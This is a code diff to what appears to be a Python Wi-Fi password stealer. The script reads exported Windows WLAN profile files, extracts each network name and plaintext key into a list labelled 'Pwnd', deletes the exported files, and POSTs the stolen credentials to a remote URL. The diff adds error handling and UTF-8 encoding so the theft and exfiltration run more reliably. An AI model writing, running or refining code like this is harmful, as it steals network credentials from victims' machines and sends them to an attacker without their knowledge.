@@ -18,7 +18,10 @@ for filename in os.listdir(path):
         xml_content = open(filename,'rb')
         as_dict = xmltodict.parse(xml_content)
         xml_content.close()
-        payload['Pwnd'].append("%s:%s"% (as_dict['WLANProfile']['name'],as_dict['WLANProfile']['MSM']['security']['sharedKey']['keyMaterial']))
+        try:
+            payload['Pwnd'].append("%s:%s"% (as_dict['WLANProfile']['name'],as_dict['WLANProfile']['MSM']['security']['sharedKey']['keyMaterial']))
+        except:
+            pass
         os.remove(filename)
 
 if len(payload["Pwnd"]) >= 1:
@@ -30,4 +33,4 @@ else:
 final_payload = ''
 for ssid in payload['Pwnd']:
     final_payload += '%s; \n' % ssid
-r = requests.post(url, params="format=json", data=final_payload)
+r = requests.post(url, params="format=json", data=final_payload.encode('UTF-8'))
